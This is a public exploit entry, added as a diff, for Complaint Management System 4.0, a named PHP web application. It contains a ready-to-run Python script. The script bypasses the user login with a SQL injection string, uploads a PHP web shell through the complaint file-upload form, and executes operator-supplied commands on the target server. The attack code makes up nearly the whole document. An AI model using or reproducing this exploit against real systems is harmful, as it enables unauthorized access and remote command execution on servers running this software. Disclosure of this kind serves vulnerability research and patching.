@@ -1,0 +1,64 @@
+# Exploit Title: Complaint Management System 4.0 - Remote Code Execution
+# Exploit Author: Metin Yunus Kandemir
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/complaint-management-sytem/
+# Version: v4.0
+# Category: Webapps
+# Tested on: Xampp for Windows
+# Description:
+# There isn't any file extension control at the "Register Complaint" section of user panel.
+# An unauthorized user can upload and execute php file.
+# Below basic python script will bypass authentication and execute command on target server.
+
+poc.py
+
+#!/usr/bin/python
+
+import requests
+import sys
+                  
+
+if len(sys.argv) !=3:
+	print "[*] Usage: PoC.py rhost/rpath command"
+	print "[*] e.g.: PoC.py 127.0.0.1/cms ipconfig"
+	exit(0) 
+
+rhost = sys.argv[1]
+command = sys.argv[2]
+
+#authentication bypass
+url = "http://"+rhost+"/users/index.php"
+data = {"username": "joke' or '1'='1'#", "password": "joke' or '1'='1'#", "submit": ""}
+
+with requests.Session() as session:
+	
+	login = session.post(url, data=data, headers = {"Content-Type": "application/x-www-form-urlencoded"})
+
+	
+	#check authentication bypass
+	check = session.get("http://"+rhost+"/users/dashboard.php", allow_redirects=False)
+	print ("[*] Status code for login: %s"%check.status_code)
+	if check.status_code == 200:
+		print ("[+] Authentication bypass was successfull")
+	else:
+		print ("[-] Authentication bypass was unsuccessful")
+		sys.exit()
+	
+	#upload php file
+	ufile = {'compfile':('command.php', '<?php system($_GET["cmd"]); ?>')}
+	fdata = {"category": "1", "subcategory": "Online Shopping", "complaintype": " Complaint", "state": "Punjab", "noc": "the end", "complaindetails": "the end","compfile": "commmand.php", "submit": ""}
+	furl = "http://"+rhost+"/users/register-complaint.php"
+	fupload = session.post(url=furl, files= ufile, data=fdata)
+
+	#execution
+	final=session.get("http://"+rhost+"/users/complaintdocs/command.php?cmd="+command)
+
+	if final.status_code == 200:
+		print "[+] Command execution completed successfully.\n"
+		print "\tPut on a happy face.\n"
+	else:
+		print "[-] Command execution was unsuccessful."
+		print "\tOne bad day!"
+		sys.exit()
+
+	print final.text
